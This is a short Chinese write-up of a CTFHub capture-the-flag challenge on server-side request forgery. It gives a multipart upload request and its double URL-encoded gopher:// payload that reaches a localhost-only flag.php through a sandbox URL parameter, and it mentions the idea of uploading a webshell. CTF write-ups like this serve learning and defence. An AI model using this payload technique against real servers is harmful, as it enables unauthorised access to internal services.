ctfhub-SSRF-上传文件



访问到flag.php之后，发现需要添加一个提交按钮，那就自己手动加一个

<input type="submit" name="submit">

最开始想的是

```
用ssrf访问flag.php上传一句话木马然后访问
```

尝试了但发现有ip限制，那么这个题又是要用gopher来打了

找个个大佬的payload

```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 292
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1lYApMMA3NDrr2iY

------WebKitFormBoundary1lYApMMA3NDrr2iY
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

SSRF Upload
------WebKitFormBoundary1lYApMMA3NDrr2iY
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundary1lYApMMA3NDrr2iY--

```

url编码后写到原本url里面



```
http://challenge-e876d53739a54897.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520292%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%250D%250A------WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.txt%2522%250D%250AContent-Type%253A%2520text/plain%250D%250A%250D%250ASSRF%2520Upload%250D%250A------WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundary1lYApMMA3NDrr2iY--
```

